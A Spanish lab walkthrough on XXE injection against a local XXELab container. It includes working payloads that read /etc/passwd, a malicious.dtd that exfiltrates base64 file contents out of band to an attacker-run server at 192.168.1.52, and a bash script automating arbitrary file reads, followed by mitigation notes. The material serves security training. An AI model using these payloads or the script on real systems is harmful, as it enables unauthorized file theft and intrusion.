# Resumen de XML External Entity (XXE) Injection

## ¿Qué es XXE?

> Una vulnerabilidad que afecta a aplicaciones que procesan datos en formato XML. Permite a un atacante inyectar código malicioso dentro del XML para leer archivos locales, hacer solicitudes internas, o incluso ejecutar otras vulnerabilidades.

## Conceptos clave explicados:

**XML:** Lenguaje de marcado que estructura datos. Ejemplo: <nombre>Juan</nombre>.

**Entidad externa (External Entity):** Una especie de variable en XML que puede hacer referencia a un recurso externo, como un archivo local `file:///etc/passwd` o una URL.

**DTD (Document Type Definition):** Parte del XML que define entidades, como variables. Ejemplo:

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
```

## Cómo se explota XXE

El atacante inyecta una entidad externa maliciosa en un XML.

El servidor procesa esa entidad sin validación, accediendo a recursos como archivos internos.

El atacante recibe información sensible (si la respuesta lo permite).

### Ataque XXE a ciegas ("Blind XXE")

Cuando no se ve directamente la información sensible en la respuesta.

El atacante hace que el servidor envíe la información a otro lugar, como su propio servidor.

Esto requiere más trabajo, pero puede ser útil si conoce parte de la estructura del sistema.

### XXE como vector de SSRF

SSRF (Server-Side Request Forgery): El atacante obliga al servidor a hacer solicitudes HTTP a otros recursos internos (como `http://localhost:8080/admin`).

Combinando XXE + SSRF, se puede escanear la red interna o atacar servicios protegidos.

## Conclusión

XXE es una vulnerabilidad grave cuando se permite procesar XML sin validaciones adecuadas.

Puede llevar a robo de información, escaneo de redes internas y ataques más complejos como SSRF.

Se evita deshabilitando entidades externas y validando correctamente las entradas XML.

___________________________________________________________

# Glosario 

## Glosario de términos relacionados con XML, XXE y PHP Wrappers

| **Término**          | **Explicación**                                                                                                                                       |
|----------------------|--------------------------------------------------------------------------------------------------------------------------------------------------------|
| **DTD**              | *Document Type Definition*. Especificación que define la estructura de un documento XML, incluyendo entidades internas o externas.                   |
| **Entidad externa**  | Recurso externo que puede ser cargado o referenciado desde un documento XML. Se usa comúnmente en ataques XXE para acceder a archivos locales.       |
| **Blind XXE**        | Variante del ataque XXE donde no se recibe una respuesta directa. Se usan canales alternativos (como DNS o HTTP) para extraer información.           |
| **SSRF**             | *Server Side Request Forgery*. Técnica que fuerza al servidor víctima a realizar peticiones HTTP/S hacia recursos internos o externos.                |
| **Wrapper en PHP**   | Protocolo especial que permite acceder a diferentes tipos de flujos de datos (archivos, red, memoria, etc.) con sintaxis uniforme: `protocolo://...` |
**Nota:** En *Blind XXE*, como no ves la respuesta, se usa una URL controlada por el atacante (ej. con `ngrok` o un servidor propio) para recibir la información filtrada.
##  Ejemplos de PHP Wrappers útiles para pruebas

| **Wrapper**                | **Descripción**                                                                 |
|----------------------------|----------------------------------------------------------------------------------|
| `file://`                  | Accede al sistema de archivos local.                                            |
| `php://filter`             | Aplica filtros a los archivos, como `base64-encode`.                           |
| `php://input`              | Accede al cuerpo crudo de una petición POST.                                   |
| `php://memory`             | Usa la memoria como archivo temporal.                                           |
| `zip://`                   | Accede al contenido de archivos ZIP.                                            |
| `data://`                  | Permite crear contenido inline con base64 o texto plano.                        |
| `expect://`                | Ejecuta comandos del sistema como si fueran flujos (rara vez habilitado).       |

___
# Guía de ejecución

## Paso 1 - Arrancar laboratorio

Acción: XXELab: https://github.com/jbarone/xxelab  --> `docker run -dit --rm -p 127.0.0.1:5000:80 xxelab`

Resultado: localhost:5000 (en el navegador)

Explicación: Iniciamos laboratorio (docker) esta en nuestro localhost por el puerto 5000

Problema: `docker run -it --rm -p 127.0.0.1:5000:80 xxelab`  --> se cierra 

Solución: `docker run -dit --rm -p 127.0.0.1:5000:80 xxelab`  --> parámetro **-d**(it) para ejecutar en segundo plano

## Paso 2 - Análisis vía BurpSuite

Acción: `burpsuite &> /dev/null & disown`

Resultado: Abrimos BurpSuite en segundo plano.

Explicación: Abrimos BurpSuite para analizar las peticiones y respuestas del servidor. Ya que tenemos un panel de autenticación para poder analizar la tramitación y formato.


## Paso 3 - Interceptación de petición vía BurpSuite

Acción: Intercept is on y foxyproxy on 

Resultado: Todo el tráfico del navegador pasa por BurpSuite 

Explicación: Interceptamos con BurpSuite y con foxyproxy envíamos el tráfico a BurpSuite


## Paso 4 - Análisis de petición

Acción: Rellenamos los campos del panel (nombre, teléfono, mail, password aceptamos condiciones) y le damos a Create account

Resultado: Petición interceptada en BurpSuite

```xml
POST /process.php HTTP/1.1

Host: localhost:5000

User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0

Accept: */*

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Referer: http://localhost:5000/

Content-Type: text/plain;charset=UTF-8

Content-Length: 144

Origin: http://localhost:5000

DNT: 1

Sec-GPC: 1

Connection: keep-alive

Sec-Fetch-Dest: empty

Sec-Fetch-Mode: cors

Sec-Fetch-Site: same-origin

Priority: u=0



<?xml version="1.0" encoding="UTF-8"?><root><name>test</name><tel>123456789</tel><email>test@test.com</email><password>test123</password></root>
```

Explicación: En BurpSuite hemos interceptado la petición y podemos analizar su estructura 

Aclaración: Content-Type: text/plain puede ser un indicador de que el backend procesa el cuerpo del XML de forma simple (sin restricciones)

## Paso 5 - Analizamos desde el repeat de BurpSuite

Acción: ctrl+r (envíar al repeat) y le damos a send (enviar) la petición y vemos lo siguiente

Resultado: Vemos que la petición se tramita del siguiente modo

```xml
HTTP/1.1 200 OK

Date: Mon, 14 Apr 2025 17:28:37 GMT

Server: Apache/2.4.7 (Ubuntu)

X-Powered-By: PHP/5.5.9-1ubuntu4.29

Content-Length: 43

Keep-Alive: timeout=5, max=100

Connection: Keep-Alive

Content-Type: text/html


Sorry, test@test.com is already registered!
```

Explicación: Nos aparece como registrado por lo que desde repeat podemos hacer pruebas en el campo del mail y ver que ocurre

Aclaración: En XXE jugamos con entidades que son elementos que se conforman en base a 'etiquetas' y 'datos', existen diferentes tipos de entidades y aquí lo que vamos a hacer es aprovecharnos del input que se nos muestra en la etiqueta mail para alterar su valor con entidades y poder inyectar código de alguna manera. Esto es clave: ahí es donde se va a insertar la entidad &xxe; cuando definas <!ENTITY xxe SYSTEM "...">

Ejemplo desde este punto: ¿Cómo sería una inyección XXE básica en este caso?
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <name>test</name>
  <tel>123456789</tel>
  <email>&xxe;</email>
  <password>test123</password>
</root>
```

Explicación rápida:

- Se define una entidad xxe que apunta a un archivo del sistema (/etc/passwd).

- Luego se llama esa entidad en el campo email.

- Si el parser es vulnerable, ese campo devolverá el contenido del archivo en la respuesta

## Paso 6 - Modificar petición 

Acción: 

```xml
POST /process.php HTTP/1.1

Host: localhost:5000

User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0

Accept: */*

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Referer: http://localhost:5000/

Content-Type: text/plain;charset=UTF-8

Content-Length: 187

Origin: http://localhost:5000

DNT: 1

Sec-GPC: 1

Connection: keep-alive

Sec-Fetch-Dest: empty

Sec-Fetch-Mode: cors

Sec-Fetch-Site: same-origin

Priority: u=0



<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE foo [<!ENTITY myName "Metahumo">]>

<root><name>test</name><tel>123456789</tel><email>&myName;</email><password>test123</password></root>
```

Resultado:

```xml 
HTTP/1.1 200 OK

Date: Mon, 14 Apr 2025 18:26:10 GMT

Server: Apache/2.4.7 (Ubuntu)

X-Powered-By: PHP/5.5.9-1ubuntu4.29

Content-Length: 38

Keep-Alive: timeout=5, max=100

Connection: Keep-Alive

Content-Type: text/html


Sorry, Metahumo is already registered!
```

Explicación: Hemos creado una entidad llamada 'myName' que al poner en la etiqueta 'email' el dato '&myName;' en la respuesta nos muestra el valor de la entidad creada, por lo tanto tenemos una vía potencial de ataque XXE 


## Paso 7 - Prueba de inyección XXE  

Acción:

```xml 
<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE foo [<!ENTITY myFile SYSTEM "file:///etc/passwd">]>

<root><name>test</name><tel>123456789</tel><email>&myFile;</email><password>test123</password></root>
```

Nota: file:// es un wrappers y como tales hay muchos, por ejemplo otro es: "php://filter/convert.base64-encode/resource=...  tras los puntos suspensivos podríamos seguir: .../resource=/etc/passwd">]>

Esta técnica utiliza un wrapper de PHP (php://filter) para que el archivo sea encodeado en base64. Es útil cuando el contenido contiene caracteres que podrían romper la respuesta, como etiquetas HTML o comillas.

Con este último wrapper lo que obtenemos es una única línea encodeada en base64 (interesante de aplicar si el formato de la respuesta lo requiere)

Resultado:

```xml 
HTTP/1.1 200 OK

Date: Mon, 14 Apr 2025 18:31:04 GMT

Server: Apache/2.4.7 (Ubuntu)

X-Powered-By: PHP/5.5.9-1ubuntu4.29

Vary: Accept-Encoding

Content-Length: 986

Keep-Alive: timeout=5, max=100

Connection: Keep-Alive

Content-Type: text/html


Sorry, root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
 is already registered!
```

Explicación: Hemos creado una entidad que apunta a una ruta conocida del sistema y en la respuesta hemos podido volcar el contenido del comando ejecutado `/etc/passwd`

Aclaración: Esto se ha podido realizar en estos términos porque en el output se nos muestra un resultado, esto no siempre es así y es cuando entra en juego lo que se conoce como XXE OOB (Out Of Band Interacction) y las External DTD. Es decir, tratamos de cargar un servidor externo http (por ejemplo con python) donde podamos cargar un archivo malicioso el cual contenga las diferentes entidades que necesitamos para extraer datos

## Paso 8 - Prueba de servidor local   

Acción:
```xml
<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE foo [<!ENTITY myFile SYSTEM "http://192.168.1.52/testXXE">]>

<root><name>test</name><tel>123456789</tel><email>&myFile;</email><password>test123</password></root>
```

Resultado:

```python
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
172.17.0.2 - - [14/Apr/2025 20:47:08] code 404, message File not found
172.17.0.2 - - [14/Apr/2025 20:47:08] "GET /testXXE HTTP/1.0" 404 -
```

Explicación: Con el wrapper http hemos tramitado una carga de archivo por un servidor que hemos montado con python y vemos que la prueba ha sido exitosa, ya que aunque aún no hemos creado el archivo que queremos cargar si que obtenemos una respuesta al tramitar la petición

## Paso 9 - Llamar a entidad fuera del campo html

Acción:

```xml
<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://192.168.1.52/malicious.dtd"> %xxe;]>

<root><name>test</name><tel>123456789</tel><email>

test@test.com

</email><password>test123</password></root>
```

Resultado:

```python
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
172.17.0.2 - - [14/Apr/2025 20:52:53] code 404, message File not found
172.17.0.2 - - [14/Apr/2025 20:52:53] "GET /malicious.dtd HTTP/1.0" 404 -
```

Explicación: En caso de no poder llamar a entidades podemos hacerlo directamente desde el DOCTYPE, esto vemos que desde el servidor levantado en local nos llega la petición enviada

## Paso 10 - Crear script xml para cargar entidades 

Acción: malicious.dtd 

```dtd
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://192.168.1.52/?file=%file;'>">    
%eval;
%exfil;
```

Resultado:

```python
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
172.17.0.2 - - [14/Apr/2025 21:05:30] "GET /malicious.dtd HTTP/1.0" 200 -
172.17.0.2 - - [14/Apr/2025 21:05:31] "GET /?file=cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCmxpYnV1aWQ6eDoxMDA6MTAxOjovdmFyL2xpYi9saWJ1dWlkOgpzeXNsb2c6eDoxMDE6MTA0OjovaG9tZS9zeXNsb2c6L2Jpbi9mYWxzZQo= HTTP/1.0" 200 -
```

Explicación: Creamos archivo .dtd para poder cargarlo desde nuestro servidor local y que se nos envíe los datos solicitados en formato base64 

Aclaración: usamos '&#x25;' porque para nombrar a los dos puntos (:) dentro de una entidad se requiere ponerlo en formato ascii hexadecimal

**Nota:** echo -n "cm9vdDp4Oj... | base64 -d    ---->    root:x:0:0:root:/root:/bin/bash...

## Paso 11 - Creación script para automatizar proceso XXE  

Acción de validación: 

```bash
curl -s -X POST "http://localhost:5000/process.php" -d '<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://192.168.1.52/malicious.dtd"> %xxe;]>

<root><name>test</name><tel>123456789</tel><email>test@test.com</email><password>test123</password></root>'
```

Resultado:

```python3
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
172.17.0.2 - - [15/Apr/2025 13:20:11] "GET /malicious.dtd HTTP/1.0" 200 -
172.17.0.2 - - [15/Apr/2025 13:20:11] "GET /?file=cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCmxpYnV1aWQ6eDoxMDA6MTAxOjovdmFyL2xpYi9saWJ1dWlkOgpzeXNsb2c6eDoxMDE6MTA0OjovaG9tZS9zeXNsb2c6L2Jpbi9mYWxzZQo= HTTP/1.0" 200 -
```

Explicación: se tramita la petición enviada por lo que en nuestro script podemos incorporar este método para obtener la respuesta del servidor 

Acción de traza:

```bash
#!/bin/bash

echo -ne "\n[+] Introduce el archivo a leer: " && read -r myFilename

malicious_dtd="""
<!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=$myFilename\">
<!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://192.168.1.52/?file=%file;'>\">    
%eval;
%exfil;"""

echo; echo $malicious_dtd
```

Resultado:

```bash  
./xxe_oob.sh

[+] Introduce el archivo a leer: /etc/hosts

<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/hosts"> <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://192.168.1.52/?file=%file;'>"> %eval; %exfil;
```

Explicación: con `echo` confirmamos que enviamos la petición con la entrada de texto deseada `/etc/hosts`

Acción: nvim xxe_oob.sh

```bash
#!/bin/bash

echo -ne "\n[+] Introduce el archivo a leer: " && read -r myFilename

malicious_dtd="""
<!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=$myFilename\">
<!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://192.168.1.52/?file=%file;'>\">    
%eval;
%exfil;"""

# Abrimos un servidor en segundo plano y almacenamos el stdin y el stdout en archivo 'response'
python3 -m http.server 80 &>response &

# Damos un segundo para que se monte el servidor, almacenamos su código de proceso y después lo matamos para no dejarlo abierto el puerto 80
PID=$!

sleep 1

curl -s -X POST "http://localhost:5000/process.php" -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://192.168.1.52/malicious.dtd"> %xxe;]>
<root><name>test</name><tel>123456789</tel><email>test@test.com</email><password>test123</password></root>'

kill -9 $PID
wait $PID 2>/dev/null
```

Resultado: Almacenado en el archivo *'response'* del directorio donde se ejecute el script *'xxe_oob.sh'* que tiene que ser donde se encuentre el script *'malicious.dtd'*

```bash
172.17.0.2 - - [15/Apr/2025 13:27:50] "GET /malicious.dtd HTTP/1.0" 200 -
172.17.0.2 - - [15/Apr/2025 13:27:50] "GET /?file=cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCmxpYnV1aWQ6eDoxMDA6MTAxOjovdmFyL2xpYi9saWJ1dWlkOgpzeXNsb2c6eDoxMDE6MTA0OjovaG9tZS9zeXNsb2c6L2Jpbi9mYWxzZQo= HTTP/1.0" 200 -
```

Explicación: Automatizamos el proceso de envío de peticiones y almacenamos la respuesta en un archivo *'response'*


## Paso 12 - Finalizar script de automatización

Acción de comprobación: filtramos por epresión regular y descodificamos con base64 

```bash
cat response | grep -oP "/?file=\K[^.*\s]+" | base64 -d
```

Resultado: El contenido del archivo response 

Explicación: Comprobamos que tenemos una forma de automatizar en el script el resultado mostrado por pantalla

Acción:

```bash
#!/bin/bash

echo -ne "\n[+] Introduce el archivo a leer: " && read -r myFilename

malicious_dtd="""
<!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=$myFilename\">
<!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://192.168.1.52/?file=%file;'>\">    
%eval;
%exfil;"""

python3 -m http.server 80 &>response &

PID=$!

sleep 1; echo

curl -s -X POST "http://localhost:5000/process.php" -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://192.168.1.52/malicious.dtd"> %xxe;]>
<root><name>test</name><tel>123456789</tel><email>test@test.com</email><password>test123</password></root>'

at response | grep -oP "/?file=\K[^.*\s]+" | base64 -d

kill -9 $PID
wait $PID 2>/dev/null

rm response 2>/dev/null
```

Explicación: Con este script podemos escribir que ficheros queremos leer y obtenerlos automáticamente en una tramitación exitosa de petición-respuesta

Problema: Entra en conflicto el script malicious.dtd ya que actualmente apunta al archivo /etc/passwd

Solución: incorporar al script una sustitución del contenido del script `malicious.dtd`

```bash
echo $malicious_dtd > malicious.dtd
```

Problema: Al ejecutar rápidamente de nuevo el script `xxe_oob.sh` puede dar error

```bash 
./xxe_oob.sh

[+] Introduce el archivo a leer: /etc/passwod

Sorry,  is already registered!./xxe_oob.sh: línea 26: 55865 Terminado (killed)      python3 -m http.server 80 &> response
```

Solución: Esperar un par de segundos y volver a ejecutar 


**Script final:**

```bash
#!/bin/bash

echo -ne "\n[+] Introduce el archivo a leer: " && read -r myFilename

malicious_dtd="""
<!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=$myFilename\">
<!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://192.168.1.52/?file=%file;'>\">    
%eval;
%exfil;"""

echo $malicious_dtd > malicious.dtd

python3 -m http.server 80 &>response &

PID=$!

sleep 1; echo

curl -s -X POST "http://localhost:5000/process.php" -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://192.168.1.52/malicious.dtd"> %xxe;]>
<root><name>test</name><tel>123456789</tel><email>test@test.com</email><password>test123</password></root>'

cat response | grep -oP "/?file=\K[^.*\s]+" | base64 -d

kill -9 $PID
wait $PID 2>/dev/null

rm response 2>/dev/null
```

___


# Cómo detectar y mitigar XXE

## Detección:

- Analizar peticiones con Content-Type: application/xml, text/xml o text/plain.

- Revisar uso de parsers como SimpleXML, DOMDocument sin restricciones.

- Usar herramientas como BurpScanner, OWASP ZAP, o detect-secrets.

## Mitigación:

- Deshabilitar entidades externas (por ejemplo, en PHP):

```php
libxml_disable_entity_loader(true);
```

- Usar parsers seguros y con validación estricta.

- Validar y sanear los datos XML de entrada.

---
